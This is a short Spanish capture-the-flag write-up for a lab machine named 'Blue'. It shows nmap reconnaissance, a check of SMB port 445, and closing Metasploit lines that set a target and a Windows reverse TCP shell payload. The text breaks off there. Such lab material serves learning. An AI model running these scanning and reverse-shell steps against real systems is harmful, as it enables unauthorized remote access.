---
description: '✍️ Autor: DarkStar7471, ben🔍 Dificultad: Fácil'
---

# Blue

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 10.10.196.186
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (758).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap 10.10.196.186
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (759).png" alt=""><figcaption></figcaption></figure>

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p135,139,445,3389 -v 10.10.196.186
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../../.gitbook/assets/image (760).png" alt=""><figcaption></figcaption></figure>

Miramos si es vulnerable el puerto 445.

<figure><img src="../../.gitbook/assets/image (761).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (762).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (763).png" alt=""><figcaption></figcaption></figure>

```bash
set RHOSTS 10.10.196.186
set payload windows/x64/shell/reverse_tcp
```
